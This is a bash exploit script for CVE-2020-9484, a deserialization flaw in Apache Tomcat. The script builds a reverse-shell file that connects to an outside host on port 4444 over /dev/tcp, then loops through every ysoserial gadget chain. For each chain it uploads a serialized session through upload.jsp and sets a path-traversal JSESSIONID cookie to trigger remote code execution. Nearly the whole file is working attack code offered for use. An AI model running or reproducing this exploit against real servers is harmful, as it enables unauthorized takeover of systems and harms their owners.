#!/bin/bash
# Exploit Title: Apache Tomcat RCE by deserialization
# Exploit Author: X
# CVE-ID: CVE-2020-9484
# Version: Apache Tomcat 9.0.27
# Tested on: Parrot OS

# Remote Code Execution by Deserialization

#java -jar ysoserial-master.jar CommonsCollections2 'ping -c 1 x.x.x.x' > bruteforcer/CommonsCollections2.session
#curl http://x.x.x.x:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../../opt/samples/uploads/CommonsCollections2' -F 'image=@./bruteforcer/CommonsCollections2.session'
#tshark -i tun0 -Y "icmp" 2>/dev/null

#comando="bash /tmp/holaputo.sh"

if [ -z "$1" ] || [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
	echo ""
	echo "$(tput setaf 3;tput bold)usage: ./serializerX.sh [target-ip] [command]"
	echo ""
	exit
fi

banner(){
cat <<"EOF"
  __   ___   ___   _    __    _     _    ___   ___   ___       __   __ 
/' _/ | __| | _ \ | |  /  \  | |   | |  |_  | | __| | _ \  __  \ \_/ / 
`._`. | _|  | v / | | | /\ | | |_  | |   / /  | _|  | v / |__|  > , <  
|___/ |___| |_|_\ |_| |_||_| |___| |_|  |___| |___| |_|_\      /_/ \_\ 
EOF
}
objetivo="$1"
comando="$2"
#comando="ping -c 1 10.x.x.x"

create_payload(){
	echo "$(tput setaf 6;tput bold)[+] Trying to create payload files.."
	sleep 1
	
	echo "$(tput setaf 6;tput bold)[+] Creating payload.sh file.."
	rm -rf payload.sh
	
	echo "#!/bin/bash" >> payload.sh
	echo "bash -i >& /dev/tcp/x.x.x.x/4444 0>&1" >> payload.sh
	sleep 1
}

banner
create_payload

for payload in $(java -jar ysoserial-master.jar 2>&1 | grep '\-------' -A 100 | grep -v '\----' | awk '{print $1}');do

	echo -e "\n[*] Probando con payload $payload"

	java -jar ysoserial-master.jar $payload "$comando" &>/dev/null > ./bruteforcer/$payload.session

	curl -s http://$objetivo:8080/upload.jsp -H "Cookie:JSESSIONID=../../../../opt/samples/uploads/$payload" -F "image=@./bruteforcer/$payload.session"  &>/dev/null

	sleep 1

	curl -s http://$objetivo:8080/upload.jsp -H "Cookie:JSESSIONID=../../../../opt/samples/uploads/$payload" &>/dev/null

	sleep 1
	
done

